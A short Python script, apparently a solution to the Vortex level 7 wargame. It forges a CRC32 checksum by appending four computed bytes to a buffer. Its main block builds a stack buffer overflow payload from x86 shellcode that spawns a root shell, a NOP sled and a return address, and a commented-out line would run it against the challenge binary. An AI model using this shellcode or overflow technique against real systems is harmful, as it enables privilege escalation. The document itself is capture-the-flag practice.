#!/usr/bin/python3

# This code is real rough, made an error early on then thought it was necessary to uint32 everything

import numpy

u = numpy.uint32

CRCPOLY = u(0xedb88320)
CRCINV = u(0x5b358fd3)
INITXOR = u(0x00000000)
FINALXOR = u(0x00000000)

#with open("crc_table") as f:
#    CRCTABLE = list(map(lambda x: u(eval(x)), f.read().rstrip('\n').split('\n')))

def tablegen():
    table = []
    for n in range(256):
        c = u(n)
        for k in range(8):
            if c & u(1):
                c = CRCPOLY ^ (c >> u(1))
            else:
                c = c >> u(1)
        table.append(c)
    return table

CRCTABLE = tablegen()

def crc32(s):
    reg = INITXOR
    for i in range(len(s)):
        reg = (reg >> u(8)) ^ CRCTABLE[((reg ^ u(s[i])) & u(0xff))]
    return reg ^ FINALXOR

def fixcrc(s, goal):
    ugoal = u(goal ^ FINALXOR)
    crcreg = INITXOR
    for i in range(len(s) - 4):
        crcreg = (crcreg >> u(8)) ^ CRCTABLE[(crcreg ^ u(s[i])) & u(0xff)]

    newend = u(0)
    for i in range(32):
        if newend & u(1):
            newend = (newend >> u(1)) ^ CRCPOLY
        else:
            newend >>= u(1)
        if ugoal & u(1):
            newend ^= CRCINV
        ugoal >>= u(1)

    newend ^= crcreg

    return s[:-4] + bytes([(newend >> u(i*8)) & u(0xff) for i in range(4)])

if __name__ == "__main__":
    import os

    shellcode = b"\x6a\x17\x58\x31\xdb\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
    #bufaddr = 0xffffddd2
    #eipaddr = 0xffffde1c
    # epi - buf = 74
    # len(shellcode) = 31
    sled = (74 - 31)*b"\x90"
    shellcodeaddr = b"\x95\xdf\xff\xff"
    exploit = shellcode + sled + shellcodeaddr + b"AAAA"
    targetCRC = u(0xe1ca95ee)
    fixed = fixcrc(exploit, targetCRC)
    print("old CRC:", hex(crc32(exploit)))
    print("new CRC:", hex(crc32(fixed)))
    print("last 4 bytes:", list(map(lambda x: hex(x), fixed[-4:])))
    
    # oh no the vortex machines don't have numpy
    #filepath = "/vortex/vortex7"
    #argv = [filepath, fixed]
    #os.execv(filepath, argv)
